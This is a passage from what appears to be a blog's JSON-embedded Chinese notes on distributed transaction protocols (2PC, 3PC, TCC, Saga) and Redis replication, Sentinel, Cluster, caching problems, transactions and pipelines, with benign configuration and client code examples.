的一致性协议的存在。\n\n# 1. 2PC 和 3PC\n\n### 1.1 2PC(tow phase commit)\n\n2PC(tow phase commit)两阶段提交[5]顾名思义它分成两个阶段，先由一方进行提议(propose)并收集其他节点的反馈(vote)，再根据反馈决定提交(commit)或中止(abort)事务。我们将提议的节点称为协调者(coordinator)，其他参与决议节点称为参与者(participants)。\n\n<img src=\"分布式一致性解决方案/4sf9lptbpv.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n第一个阶段是**「投票阶段」**\n\n- 1.协调者首先将命令「写入日志」\n- 2. 「发一个prepare命令」给B和C节点这两个参与者\n- 3.B和C收到消息后，根据自己的实际情况，「判断自己的实际情况是否可以提交」\n- 4.将处理结果「记录到日志」系统\n- 5.将结果「返回」给协调者\n\n<img src=\"分布式一致性解决方案/26a16oglz0.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n第二个阶段是**「决定阶段」**\n\n当A节点收到B和C参与者所有的确认消息后\n\n- 「判断」所有协调者「是否都可以提交」\n  - 如果可以则「写入日志」并且发起commit命令\n  - 有一个不可以则「写入日志」并且发起abort命令\n- 参与者收到协调者发起的命令，「执行命令」\n- 将执行命令及结果「写入日志」\n- 「返回结果」给协调者\n\n\n\ncoordinator根据participant的反馈，提交或中止事务，如果participant全部同意则提交，只要有一个participant不同意就中止。  \n\n在异步环境(asynchronous)并且没有节点宕机(fail-stop)的模型下，2PC可以满足全认同、值合法、可结束，是解决一致性问题的一种协议。\n\n\n\n**可能会存在哪些问题？**\n\n- **「单点故障」**：一旦事务管理器出现故障，整个系统不可用\n- **「数据不一致」**：在阶段二，如果事务管理器只发送了部分 commit 消息，此时网络发生异常，那么只有部分参与者接收到 commit 消息，也就是说只有部分参与者提交了事务，使得系统数据不一致。\n- **「响应时间较长」**：整个消息链路是串行的，要等待响应结果，不适合高并发的场景\n- **「不确定性」**：当事务管理器发送 commit 之后，并且此时只有一个参与者收到了 commit，那么当该参与者与事务管理器同时宕机之后，重新选举的事务管理器无法确定该条消息是否提交成功。\n\n### 1.2 3PC(three phase commit)\n\n3PC(three phase commit)即三阶段提交。相对于2PC来说增加了CanCommit阶段和超时机制。如果段时间内没有收到协调者的commit请求，那么就会自动进行commit，解决了2PC单点故障的问题。\n\n<img src=\"分布式一致性解决方案/81875376-AFEA-4A0C-9770-958FEFD27509.png\" alt=\"f2f443bf6560482a3a4dd3eeb002bedb\" style=\"zoom:150%;\" />\n\n- 第一阶段：「CanCommit阶段」\n\n  这个阶段所做的事很简单，就是协调者询问事务参与者，你是否有能力完成此次事务。\n\n  - 如果都返回yes，则进入第二阶段\n  - 有一个返回no或等待响应超时，则中断事务，并向所有参与者发送abort请求\n\n- 第二阶段：「PreCommit阶段」\n\n  此时协调者会向所有的参与者发送PreCommit请求，参与者收到后开始执行事务操作，并将Undo和Redo信息记录到事务日志中。参与者执行完事务操作后（此时属于未提交事务的状态），就会向协调者反馈“Ack”表示我已经准备好提交了，并等待协调者的下一步指令。\n\n- 第三阶段：「DoCommit阶段」\n\n  在阶段二中如果所有的参与者节点都可以进行PreCommit提交，那么协调者就会从“预提交状态”转变为“提交状态”。然后向所有的参与者节点发送\"doCommit\"请求，参与者节点在收到提交请求后就会各自执行事务提交操作，并向协调者节点反馈“Ack”消息，协调者收到所有参与者的Ack消息后完成事务。相反，如果有一个参与者节点未完成PreCommit的反馈或者反馈超时，那么协调者都会向所有的参与者节点发送abort请求，从而中断事务。\n\n\n\n**participant如果在不同阶段宕机，我们来看看3PC如何应对：**\n\n- 阶段1: coordinator或watchdog未收到宕机participant的vote，直接中止事务；宕机的participant恢复后，读取logging发现未发出赞成vote，自行中止该次事务\n- 阶段2: coordinator未收到宕机participant的precommit ACK，但因为之前已经收到了宕机participant的赞成反馈(不然也不会进入到阶段2)，coordinator进行commit；watchdog可以通过问询其他participant获得这些信息，过程同理；宕机的participant恢复后发现收到precommit或已经发出赞成vote，则自行commit该次事务\n- 阶段3: 即便coordinator或watchdog未收到宕机participant的commit ACK，也结束该次事务；宕机的participant恢复后发现收到commit或者precommit，也将自行commit该次事务\n\n\n\n因为有了准备提交(prepare to commit)阶段，3PC的事务处理延时也增加了1个RTT，变为3个RTT(propose+precommit+commit)，但是它防止participant宕机后整个系统进入阻塞态，增强了系统的可用性，对一些现实业务场景是非常值得的。\n\n# 2. 柔性事务方案\n\n### 2.1 TCC 补偿\n\nTCC（Try-Confirm-Cancel）又被称补偿事务，TCC与2PC的思想很相似，事务处理流程也很相似，但**2PC是应用于在DB层面，TCC则可以理解为在应用层面的2PC，是需要我们编写业务逻辑来实现**。\n\nTCC它的核心思想是：\"针对每个操作都要注册一个与其对应的确认（Try）和补偿（Cancel）\"。它分为三个阶段：Try,Confirm,Cancel\n\nTry阶段执行成功并开始执行 Confirm阶段时，默认 Confirm阶段是不会出错的。即：只要Try成功，Confirm一定成功。\n\n<img src=\"分布式一致性解决方案/s6k4jk82zh.png\" alt=\"img\" style=\"zoom:67%;\" />\n\nTCC 事务机制相比于上面介绍的2PC，解决了其几个缺点：\n\n- 1.**「解决了协调者单点」**，由主业务方发起并完成这个业务活动。业务活动管理器也变成多点，引入集群。\n- 2.**「同步阻塞」**：引入超时，超时后进行补偿，并且不会锁定整个资源，将资源转换为业务逻辑形式，粒度变小。\n- 3.**「数据一致性」**，有了补偿机制之后，由业务活动管理器控制一致性。\n\n总之，TCC 就是通过代码人为实现了两阶段提交，不同的业务场景所写的代码都不一样，并且很大程度的**「增加」**了业务代码的**「复杂度」**，因此，这种模式并不能很好地被复用。\n\n### 2.2 本地消息表\n\n<img src=\"分布式一致性解决方案/bVcTlFE.png\" alt=\"image.png\" style=\"zoom:50%;\" />\n\n写本地消息和业务操作放在一个事务里，保证了业务和发消息的原子性，要么他们全都成功，要么全都失败。\n\n容错机制：\n\n- 扣减余额事务 失败时，事务直接回滚，无后续步骤\n- 轮序生产消息失败， 增加余额事务失败都会进行重试\n\n本地消息表的特点：\n\n- 不支持回滚\n- 轮询生产消息难实现，如果定时轮询会延长事务总时长，如果订阅binlog则开发维护困难\n\n适用于可异步执行的业务，且后续操作无需回滚的业务\n\n### 2.3 事务消息\n\n在上述的本地消息表方案中，生产者需要额外创建消息表，还需要对本地消息表进行轮询，业务负担较重。阿里开源的RocketMQ 4.3之后的版本正式支持事务消息，该事务消息本质上是把本地消息表放到RocketMQ上，解决生产端的消息发送与本地事务执行的原子性问题。\n\n事务消息发送及提交：\n\n- 发送消息（half消息）\n- 服务端存储消息，并响应消息的写入结果\n- 根据发送结果执行本地事务（如果写入失败，此时half消息对业务不可见，本地逻辑不执行）\n- 根据本地事务状态执行Commit或者Rollback（Commit操作发布消息，消息对消费者可见）\n\n<img src=\"分布式一致性解决方案/bVcXNbU.png\" alt=\"image.png\" style=\"zoom:60%;\" />\n\n\n\n\n\n### 2.4 最大努力通知\n\n最大努力通知的方案实现比较简单，适用于一些最终一致性要求较低的业务。\n\n执行流程：\n\n- 系统 A 本地事务执行完之后，发送个消息到 MQ；\n- 这里会有个专门消费 MQ 的服务，这个服务会消费 MQ 并调用系统 B 的接口；\n- 要是系统 B 执行成功就 ok 了；要是系统 B 执行失败了，那么最大努力通知服务就定时尝试重新调用系统 B, 反复 N 次，最后还是不行就放弃。\n\n### 2.5 Saga\n\n将长事务拆分为多个短事务，由 Saga 事务协调器协调，如果每个短事务都成功提交完成，那么全局事务就正常完成，如果某个步骤失败，则根据相反顺序一次调用补偿操作。\n\n\n\n# 3. 参考资料\n\n+ https://github.com/wangzhiwubigdata/God-Of-BigData\n\n+ https://www.bilibili.com/video/BV1TW411M7Fx\n\n+ https://seata.io/zh-cn/blog/seata-at-tcc-saga.html\n\n+ https://segmentfault.com/a/1190000040321750\n\n+ http://thesecretlivesofdata.com/raft/\n\n+ https://pdai.tech/md/arch/arch-z-transection.html\n\n+ https://github.com/dtm-labs/dtm","tags":["分布式"],"categories":["分布式"]},{"title":"redis主从复制和哨兵集群","url":"%2Fp%2F68fa54c2.html","content":"\n# 1. 主从复制\n\n主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。\n\n<!-- more -->\n\n### 1.1 作用\n\n主从复制的作用主要包括：\n\n- 数据冗余：主从复制实现了数据的热备份，是持久化之外的一种数据冗余方式。\n- 故障恢复：当主节点出现问题时，可以由从节点提供服务，实现快速的故障恢复；实际上是一种服务的冗余。\n- 负载均衡：在主从复制的基础上，配合读写分离，可以由主节点提供写服务，由从节点提供读服务（即写Redis数据时应用连接主节点，读Redis数据时应用连接从节点），分担服务器负载；尤其是在写少读多的场景下，通过多个从节点分担读负载，可以大大提高Redis服务器的并发量。\n- 高可用基石：除了上述作用以外，主从复制还是哨兵和集群能够实施的基础，因此说主从复制是Redis高可用的基础。\n\n### 1.2 全量复制\n\n注意：在2.8版本之前只有全量复制，而2.8版本后有全量和增量复制：\n\n\n\n<img src=\"redis主从复制和哨兵集群/image-20230831114442450.png\" alt=\"image-20230831114442450\" style=\"zoom:50%;\" />\n\n**第一阶段是主从库间建立连接、协商同步的过程**\n\n+ 从库给主库发送 psync 命令，表示要进行数据同步，主库根据这个命令的参数来启动复制。\n+ 主库收到 psync 命令后，会用 FULLRESYNC 响应命令带上两个参数：主库 runID 和主库目前的复制进度 offset，返回给从库。FULLRESYNC 响应表示第一次复制采用的全量复制，也就是说，主库会把当前所有的数据都复制给从库。\n\n**第二阶段，主库将所有数据同步给从库**。\n\n+ 主库执行 bgsave 命令，生成 RDB 文件，接着将文件发给从库。从库接收到 RDB 文件后，会先清空当前数据库，然后加载 RDB 文件。\n\n**第三个阶段，主库会把第二阶段执行过程中新收到的写命令，再发送给从库**。\n\n+ 当主库完成 RDB 文件发送后，就会把此时 replication buffer 中的修改操作发给从库，从库再重新执行这些操作。这样一来，主从库就实现同步了。\n\n##### 配置\n\n```bash\n# 主redis配置, 无需特殊配置, 因为在 docker 内, 需要修改一下bind\nvi $PWD/redis1/redis.conf\nbind 127.0.0.1 改为 bind 0.0.0.0\n\n# 修改从redis配置, 修改 redis.conf 文件\nvi $PWD/redis2/redis.conf\nslaveof 172.17.0.1 63791\n```\n\n\n\n### 1.3 增量复制\n\n> 在 Redis 2.8 版本引入了增量复制。\n\n \n\n<img src=\"redis主从复制和哨兵集群/image-20230831115201039.png\" alt=\"image-20230831115201039\" style=\"zoom:50%;\" />\n\n当主服务器进行命令传播的时候，maser不仅将所有的数据更新命令发送到所有slave的replication buffer，还会写入replication backlog。\n\n当断开的slave重新连接上master的时候，slave将会发送psync命令（包含复制的偏移量offset），请求partial resync。如果请求的offset不存在，那么执行全量的sync操作，相当于重新建立主从复制。\n\n##### repl backlog buffer\n\n一个主库只分配一个repl backlog， 是在增量复制阶段出现。\n\n它是为了从库断开之后，如何找到主从差异数据而设计的环形缓冲区，因为是环形结构，会直接覆盖起始位置数据。如果从库断开时间太久，repl_backlog_buffer环形缓冲区被主库的写命令覆盖了，那么从库连上主库后只能乖乖地进行一次全量复制。\n\n##### replication buffer\n\n 主库会给每个新连接的从库，分配一个replication buffer。\n\nreplication buffer对应于每个slave 。从库也是一个client，每个client连上Redis后，Redis都会分配一个client buffer，Redis先把数据写到这个buffer中，然后再把buffer中的数据发到client socket中再通过网络发送出去，这样就完成了数据交互。\n\n# 2. 哨兵\n\nRedis Sentinel，即Redis哨兵，在Redis 2.8版本开始引入。哨兵的核心功能是主节点的自动故障转移。\n\n因为Redis Sentinel实际上就是一个运行在特殊模式下的Redis服务器，所以用户也可以使用命令redis-server sentinel.conf --sentinel去启动一个Sentinel：这里的--sentinel参数用于指示Redis服务器进入Sentinel模式，从而变成一个Redis Sentinel而不是普通的Redis服务器。\n\n### 2.1 哨兵的功能\n\n+ 监控（Monitoring）\n\n  哨兵会不断地检查主节点和从节点是否运作正常。\n\n+ 自动故障转移（Automatic failover）\n\n  当主节点不能正常工作时，哨兵会开始自动故障转移操作，它会将失效主节点的其中一个从节点升级为新的主节点，并让其他从节点改为复制新的主节点。\n\n\n+ 配置提供者（Configuration provider）\n\n  客户端在初始化时，通过连接哨兵来获得当前Redis服务的主节点地址。\n\n+ 通知（Notification）\n\n  哨兵可以将故障转移的结果发送给客户端。\n\n\n\n其中，监控和自动故障转移功能，使得哨兵可以及时发现主节点故障并完成转移；而配置提供者和通知功能，则需要在与客户端的交互中才能体现。\n\n### 2.2 哨兵集群的组建\n\n哨兵实例之间可以相互发现，要归功于 Redis 提供的 pub/sub 机制，也就是发布 / 订阅机制。\n\n在主从集群中，主库上有一个名为`__sentinel__:hello`的频道，不同哨兵就是通过它来相互发现，实现互相通信的。在下图中，哨兵 1 把自己的 IP（172.16.19.3）和端口（26579）发布到`__sentinel__:hello`频道上，哨兵 2 和 3 订阅了该频道。那么此时，哨兵 2 和 3 就可以从这个频道直接获取哨兵 1 的 IP 地址和端口号。然后，哨兵 2、3 可以和哨兵 1 建立网络连接。\n\n<img src=\"redis主从复制和哨兵集群/image-20230831124346791.png\" alt=\"image-20230831124346791\" style=\"zoom:50%;\" />\n\n```bash\n# sentinel monitor <master-name> <master-host> <master-port> <quorum>\n# 举例如下：\nsentinel monitor mymaster 127.0.0.1 6379 2\n```\n\n\n\n### 2.3 哨兵监控Redis库\n\n这是由哨兵向主库发送 INFO 命令来完成的。就像下图所示，哨兵 2 给主库发送 INFO 命令，主库接受到这个命令后，就会把从库列表返回给哨兵。接着，哨兵就可以根据从库列表中的连接信息，和每个从库建立连接，并在这个连接上持续地对从库进行监控。哨兵 1 和 3 可以通过相同的方法和从库建立连接。\n\n<img src=\"redis主从复制和哨兵集群/image-20230831124508686.png\" alt=\"image-20230831124508686\" style=\"zoom:50%;\" />\n\n### 2.4 主库下线的判定\n\n首先要理解两个概念：主观下线和客观下线。\n\n- 主观下线\n\n  任何一个哨兵都是可以监控探测，并作出Redis节点下线的判断。\n\n- 客观下线\n\n  有哨兵集群共同决定Redis节点是否下线。\n\n当某个哨兵（如下图中的哨兵2）判断主库“主观下线”后，就会给其他哨兵发送 `is-master-down-by-addr` 命令。接着，其他哨兵会根据自己和主库的连接情况，做出 Y 或 N 的响应，Y 相当于赞成票，N 相当于反对票。\n\n<img src=\"redis主从复制和哨兵集群/image-20230831124617329.png\" alt=\"image-20230831124617329\" style=\"zoom:50%;\" />\n\n如果赞成票数（这里是2）是大于等于哨兵配置文件中的 `quorum` 配置项（比如这里如果是quorum=2）, 则可以判定主库客观下线了。\n\n### 2.5 哨兵 Leader 的选举\n\n为了避免哨兵的单点情况发生，所以需要一个哨兵的分布式集群。哨兵的选举机制其实很简单，就是一个Raft选举算法： 选举的票数大于等于num(sentinels)/2+1时，将成为领导者，如果没有超过，继续选举。\n\n任何一个想成为 Leader 的哨兵，要满足两个条件。第一，拿到半数以上的赞成票；第二，拿到的票数同时还需要大于等于哨兵配置文件中的 quorum 值。\n\n以 3 个哨兵为例，假设此时的 quorum 设置为 2，那么，任何一个想成为 Leader 的哨兵只要拿到 2 张赞成票，就可以了。\n\n### 2.6 哨兵Leader 故障转移\n\n主从故障转移操作包含以下四个步骤：\n\n- 第一步：在已下线主节点（旧主节点）属下的所有「从节点」里面，挑选出一个从节点，并将其转换为主节点。\n- 第二步：让已下线主节点属下的所有「从节点」修改复制目标，修改为复制「新主节点」；\n- 第三步：将新主节点的 IP 地址和信息，通过「发布者/订阅者机制」通知给客户端；\n- 第四步：继续监视旧主节点，当这个旧主节点重新上线时，将它设置为新主节点的从节点；\n\n##### 新主库的选出\n\n- 过滤掉不健康的（下线或断线），没有回复过哨兵ping响应的从节点\n- 选择`salve-priority`从节点优先级最高（redis.conf）的\n- 选择复制偏移量最大，只复制最完整的从节点\n\n<img src=\"redis主从复制和哨兵集群/image-20230831125253170.png\" alt=\"image-20230831125253170\" style=\"zoom:50%;\" />\n\n\n\n##### 判定主库客观下线 和  是否能够主从切换？\n\nRedis 1主4从，5个哨兵，哨兵配置quorum为2，如果3个哨兵故障，当主库宕机时，哨兵能否判断主库“客观下线”？能否自动切换？\n\n1、哨兵集群可以判定主库“主观下线”。由于quorum=2，所以当一个哨兵判断主库“主观下线”后，询问另外一个哨兵后也会得到同样的结果，2个哨兵都判定“主观下线”，达到了quorum的值，因此，哨兵集群可以判定主库为“客观下线”。\n\n2、但哨兵不能完成主从切换。哨兵标记主库“客观下线后”，在选举“哨兵领导者”时，一个哨兵必须拿到超过多数的选票(5/2+1=3票)。但目前只有2个哨兵活着，无论怎么投票，一个哨兵最多只能拿到2票，永远无法达到`N/2+1`选票的结果。\n\n\n\n# 3. Redis Cluster\n\nRedis-cluster是一种服务器Sharding技术，Redis3.0以后版本正式提供支持。Redis Cluster 功能 ： 负载均衡，故障切换**，**主从复制。\n\n**Redis Cluster要求至少需要3个master才能组成一个集群，同时每个master至少需要有一个slave节点。**各个节点之间保持TCP通信。当master发生了宕机， Redis Cluster自动会将对应的slave节点提拔为master，来重新对外提供服务。\n\n<img src=\"redis主从复制和哨兵集群/68747470733a2f2f6f7363696d672e6f736368696e612e6e65742f6f73636e65742f30393166626664326437306266346531613932663861306235313039353937666565652e6a7067.png\" alt=\"img\" style=\"zoom:77%;\" />\n\n### 3.1 特点\n\n- 多主多从，去中心化\n\n  从节点作为备用，复制主节点，不做读写操作，不提供服务。\n\n- 不支持处理多个key\n\n  因为数据分散在多个节点，在数据量大高并发的情况下会影响性能；\n\n- 支持动态扩容节点\n\n  这是我认为算是Rerdis Cluster最大的优点之一\n\n- 节点之间相互通信，相互选举，不再依赖sentinel\n\n  准确来说是主节点之间相互“监督”，保证及时故障转移。\n\n### 3.2 哈希槽分区\n\nRedis-cluster没有使用一致性hash，而是引入了哈希槽的概念。Redis-cluster中有16384(即2的14次方）个哈希槽，每个key通过CRC16校验后对16383取模来决定放置哪个槽。Cluster中的每个节点负责一部分hash槽（hash slot）。\n\n比如我们现在有5个节点，每个节点平均大约负责3276个槽。Redis Cluster 计算公式：slot=CRC16（key）% 16383。每一个节点负责维护一部分槽以及槽所映射的键值数据。\n\n<img src=\"redis主从复制和哨兵集群/1460000038771815.jpeg\" alt=\"img\" style=\"zoom:70%;\" />\n\n\n\n# 4. 缓存问题\n### 4.1 缓存穿透(攻击，用布隆过滤器)\n\n缓存穿透是指缓存和数据库中都没有的数据，而用户不断发起请求。由于缓存不命中，并且出于容错考虑，如果从数据库查不到数据则不写入缓存，这将导致这个不存在的数据每次请求都要到数据库去查询，失去了缓存的意义。\n\n如发起为id为“-1”的数据或id为特别大不存在的数据。这时的用户很可能是攻击者，攻击会导致数据库压力过大。\n\n**解放方案**\n\n+ 接口层增加校验，如用户鉴权校验，id做基础校验，id<=0的直接拦截；\n\n+ 从缓存取不到的数据，在数据库中也没有取到，这时也可以将key-value对写为key-null，缓存有效时间可以设置短点，如30秒（设置太长会导致正常情况也没法使用）。这样可以防止攻击用户反复用同一个id暴力攻击\n\n+ 布隆过滤器。bloomfilter就类似于一个hash set，用于快速判某个元素是否存在于集合中，其典型的应用场景就是快速判断一个key是否存在于某容器，不存在就直接返回。布隆过滤器的关键就在于hash算法和容器大小。\n\n   布隆判断有可能是错的(别人的 hash 碰撞)。不过告诉我不存在，就一定不存在。 先去布隆过滤器查询，再去 redis。\n\n### 4.2 缓存击穿\n\n缓存击穿是指缓存中没有但数据库中有的数据（一般是缓存时间到期），这时由于并发用户特别多，同时读缓存没读到数据，又同时去数据库去取数据，引起数据库压力瞬间增大，造成过大压力。\n\n**解决方案**\n\n+ 设置热点数据永远不过期。\n\n+ 接口限流与熔断，降级。重要的接口一定要做好限流策略，防止用户恶意刷接口，同时要降级准备，当接口中的某些 服务 不可用时候，进行熔断，失败快速返回机制。\n\n+ 加互斥锁\n\n### 4.3 缓存雪崩\n\n缓存雪崩是指缓存中数据大批量到过期时间，而查询数据量巨大，引起数据库压力过大甚至down机。和缓存击穿不同的是，缓存击穿指并发查同一条数据，缓存雪崩是不同数据都过期了，很多数据都查不到从而查数据库。\n\n但是也有Redis 挂掉了，请求全部走数据库。对缓存数据设置相同的过期时间，导致某段时间内缓存失效，请求全部走数据库。\n\n**解决方案**\n\n+ 缓存数据的过期时间设置随机，防止同一时间大量数据过期现象发生。\n\n+ 实现 Redis 的高可用 (主从架构 + Sentinel 或者 Redis Cluster)，尽量避免 Redis 挂掉这种情况发生。\n\n+ 万一 Redis 真的挂了，我们可以设置本地缓存 + 限流，尽量避免我们的数据库被干掉 (起码能保证我们的服务还是能正常工作的)\n\n### 4.4 bigkey\n\n1. String 类型的 key 对应的value超过 10 MB。\n2. list、set、hash、zset等集合类型，集合元素个数超过 5000个。\n\n**解决方案**\n\n+ 将Big Key拆分成多个小的key。这个方法比较简单，但是需要修改应用程序的代码。就像是把一个大蛋糕切成小蛋糕一样，有点费力，但是可以解决问题。\n+ 对Redis中的大Key进行清理，从Redis中删除此类数据。Redis自4.0起提供了UNLINK命令，该命令能够以非阻塞的方式缓慢逐步的清理传入的Key，通过UNLINK，你可以安全的删除大Key甚至特大Key。\n\n### 4.5 hotkey\n\n1. 热点数据：某些数据具有较高的访问频率，例如热门商品、热门新闻、热门评论等。\n2. 业务高峰期：当处于业务高峰期的时候，某些数据会被频繁访问，例如双11秒杀、整点秒杀等。\n\n**解决方案**\n\n+ 数据分片是通过将热点数据分散存储在多个Redis节点上，避免单个节点负载过高，是解决热点Key问题最常用的策略。\n+ 缓存预热是指在系统启动或重启后，主动将热点数据加载到缓存中。这样，当用户访问这些热点数据时，可以直接从缓存中获取，避免对后端数据库造成压力。缓存预热可以通过定时任务或应用程序启动时加载热点数据实现。\n\n### 4.6 分区不均匀\n\n可能原因：大Key、Hash Tags。\n\n+ 大key。对key进行拆分。\n\n-  HashTag 机制使用{}大括号，指定key只计算大括号内字符串的哈希，从而将不同key的健值对插入到同一个哈希槽。\n\n  检查下业务代码，有没有引入HashTag，将太多的key路由到了一个实例。\n\n# 5. 头脑风暴\n\n+ 主从复制有全量复制和增量复制，全量就是rdb，增量就是一个环形缓冲区。\n+ 哨兵是特殊的redis命令进行监控，哨兵要组成一个集群监控主库。选主哨兵leader然后主观和客观判断是否主从切换。\n+ Redis cluster 集群是分区的方案，数据存在很多节点。每个节点又会有主从复制。\n+ 缓存穿透：布隆过滤器。缓存击穿：限流。缓存雪崩：随机过期时间。\n+ 大key要去做分割，热key要去分片或内存预热，分区不均匀是大key和hashtag机制。\n\n\n# 6. 参考资料\n\n+ https://www.liuvv.com/p/2aa5fdb4.html\n+ https://www.xiaolincoding.com/redis/cluster/sentinel.html\n+ https://segmentfault.com/a/1190000038771812\n+ https://www.cnblogs.com/jian0110/p/14002555.html\n\n","tags":["redis"],"categories":["redis"]},{"title":"redis订阅事务管道多线程等高级特性","url":"%2Fp%2Fd6c4a96f.html","content":"\n# 1. 发布订阅\n\nRedis 的 SUBSCRIBE 命令可以让客户端订阅任意数量的频道， 每当有新信息发送到被订阅的频道时， 信息就会被发送给所有订阅指定频道的客户端。\n\nRedis有两种发布/订阅模式：\n\n- 基于频道(Channel)的发布/订阅\n- 基于模式(pattern)的发布/订阅\n\n<!-- more -->\n\n### 1.1 基于频道(Channel)的发布/订阅\n\n+ 发布\n\n```bash\n127.0.0.1:6379> publish channel:1 hi\n(integer) 1\n```\n\n+ 订阅\n\n```bash\n127.0.0.1:6379> subscribe channel:1\nReading messages... (press Ctrl-C to quit)\n1) \"subscribe\" // 消息类型\n2) \"channel:1\" // 频道\n3) \"hi\" // 消息内容\n```\n\n执行上面命令客户端会进入订阅状态，处于此状态下客户端不能使用除`subscribe`、`unsubscribe`、`psubscribe`和`punsubscribe`这四个属于\"发布/订阅\"之外的命令，否则会报错。\n\n\n\n### 1.2 基于模式(pattern)的发布/订阅\n\n<img src=\"redis订阅事务管道多线程等高级特性/image-20230830202605843.png\" alt=\"image-20230830202605843\" style=\"zoom:50%;\" />\n\n当有信息发送到 tweet.shop.kindle 频道时， 信息除了发送给 clientX 和 clientY 之外， 还会发送给订阅 tweet.shop.* 模式的 client123 和 client256 \n\n```bash\n127.0.0.1:6379> psubscribe c? b* d?*\nReading messages... (press Ctrl-C to quit)\n```\n\n# 2. 事务\n\nRedis事务就是一次性、顺序性、排他性的执行一个队列中的一系列命令。准确的讲，Redis 事务包含两种模式 : 事务模式 和 Lua 脚本。\n\n### 2.1 事务的使用\n\n- MULTI ：开启事务，redis会将后续的命令逐个放入队列中，然后使用EXEC命令来原子化执行这个命令系列。\n- EXEC：执行事务中的所有操作命令。\n- DISCARD：取消事务，放弃执行事务块中的所有命令。\n- WATCH：监视一个或多个key,如果事务在执行前，这个key(或多个key)被其他命令修改，则事务被中断，不会执行事务中的任何命令。\n- UNWATCH：取消WATCH对所有key的监视。\n\n```bash\n127.0.0.1:6379> set k1 v1\nOK\n127.0.0.1:6379> set k2 v2\nOK\n127.0.0.1:6379> MULTI\nOK\n127.0.0.1:6379> set k1 11\nQUEUED\n127.0.0.1:6379> set k2 22\nQUEUED\n127.0.0.1:6379> EXEC\n1) OK\n2) OK\n127.0.0.1:6379> get k1\n\"11\"\n127.0.0.1:6379> get k2\n\"22\"\n127.0.0.1:6379>\n```\n\n### 2.2 事务错误处理\n\n+ 语法错误（编译器错误），开启事务后，修改k1值为11，k2值为22，但k2语法错误，最终导致事务提交失败，k1、k2保留原值。\n+ Redis类型错误（运行时错误），开启事务后，修改k1值为11，k2值为22，但将k2的类型作为List，在运行时检测类型错误，最终导致事务提交失败，此时事务并没有回滚，而是跳过错误命令继续执行， 结果k1值改变、k2保留原值。\n\n1. 命令入队时报错， 会放弃事务执行，保证原子性（回滚）。\n2. 命令入队时正常，执行 EXEC 命令后报错，不保证原子性(不回滚)。\n\n### 2.3  Redis 的 ACID\n\n- **原子性atomicity**\n\n首先通过上文知道 运行期的错误是不会回滚的，很多文章由此说Redis事务违背原子性的；而官方文档认为是遵从原子性的。\n\nRedis官方文档给的理解是，**Redis的事务是原子性的：所有的命令，要么全部执行，要么全部不执行**。而不是完全成功。\n\n- **一致性consistency**\n\nredis事务可以保证命令失败的情况下得以回滚，数据能恢复到没有执行之前的样子，是保证一致性的，除非redis进程意外终结。\n\n- **隔离性Isolation**\n\nredis事务是严格遵守隔离性的，原因是redis是单进程单线程模式(v6.0之前），可以保证命令执行过程中不会被其他客户端命令打断。\n\n但是，Redis不像其它结构化数据库有隔离级别这种设计。\n\n- **持久性Durability**\n\n**redis事务是不保证持久性的**，这是因为redis持久化策略中不管是RDB还是AOF都是异步执行的，不保证持久性是出于对性能的考虑。\n\n\n\n### 2.4  分布式锁能用事务吗\n\n`setnx`和`expire`是两条指令而不是原子指令。如果这两条指令可以一起执行就不会出现问题。\n\n也许你会想到用Redis事务来解决。但是这里不行，因为expire是依赖于setnx的执行结果的，如果setnx的执行结果的，如果setnx没抢到锁，expire是不应该执行的。redis事务里没有if-else分支逻辑，事务的特点是一口气执行，要么全部执行要么一个都不执行。\n\n\n\nRedis2.8版本中作者加入了`set`指令的扩展参数，使得`setnx`和`expire`组合在一起的原子指令一起执行，它就是redis分布式锁的原理; \n\n```bash\nSET key uuid NX EX seconds\n```\n\n\n\n# 3. 管道 Pipeline\n\n+ redis的管道命令，允许client将多个请求依次发给服务器，过程中而不需要等待请求的回复，在最后再一并读取结果即可。\n\n+ pipeline不保证原子性。\n\n```go\npackage main\n\nimport (\n    \"github.com/go-redis/redis\"\n    \"fmt\"\n)\n\nfunc main() {\n    client := redis.NewClusterClient(&redis.ClusterOptions{\n        Addrs: []string{\"192.168.120.110:6379\"},\n        ReadOnly: true,\n        RouteRandomly: true,\n    })\n\n    pipe := client.Pipeline()\n    pipe.HGetAll(\"1\")\n    pipe.HGetAll(\"2\")\n    pipe.HGetAll(\"3\")\n    cmders, err := pipe.Exec()\n    if err != nil {\n        fmt.Println(\"err\", err)\n    }\n    for _, cmder := range cmders {\n        cmd := cmder.(*redis.StringStringMapCmd)\n        strMap, err := cmd.Result()\n        if err != nil {\n            fmt.Println(\"err\", err)\n        }\n        fmt.Println(\"strMap\", strMap)\n    }\n}\n```\n\n# 4. 多线程\n\n我们所说的Redis单线程，指的是\"其网络IO和键值对读写是由一个线程完成的\"，也就是说，Redis中只有网络请求模块和数据操作模块是单线程的。而其他的如持久化存储模块、集群支撑模块等是多线程的。\n\n### 4.1 为什么用单线程\n\n所以说，Redis中并不是没有多线程模型的，早在Redis 4.0的时候就已经针对部分命令做了多线程化。\n\n1、Redis 操作基于内存，绝大多数操作的性能瓶颈不在 CPU。\n2、使用单线程模型，可维护性更高，开发，调试和维护的成本更低。\n3、单线程模型，避免了线程间切换带来的性能开销。\n4、在单线程中使用多路复用 I/O技术也能提升Redis的I/O利用率。\n\n### 4.2 Redis 6.0的多线程\n\nRedis 6.0采用多个IO线程来处理网络请求，网络请求的解析可以由其他线程完成，然后把解析后的请求交由主线程进行实际的内存读写。提升网络请求处理的并行度，进而提升整体性能。\n\n但是，Redis 的多 IO 线程只是用来处理网络请求的，对于读写命令，Redis 仍然使用单线程来处理。\n\n<img src=\"redis订阅事务管道多线程等高级特性/1.png\" alt=\"Redis6.0多线程\" style=\"zoom:70%;\" />\n\n# 5. 事件驱动\n\nRedis 采用事件驱动机制来处理大量的网络IO。它并没有使用 libevent 或者 libev 这样的成熟开源方案，而是自己实现一个非常简洁的事件驱动库 ae_event。\n\n### 5.1 文件事件\n\n文件事件其实就是对Socket操作的抽象，Redis服务器与Redis客户端的通信会产生文件事件，服务器通过监听并处理这些事件来完成一系列的网络操作。\n\n文件事件处理器使用I/O多路复用（epoll）程序来同时监听多个Socket。epoll 一旦监测到 FD 上有请求到达时，就会触发相应的事件。这些事件会被放进一个事件队列，Redis 单线程对该事件队列不断进行处理。\n\nRedis 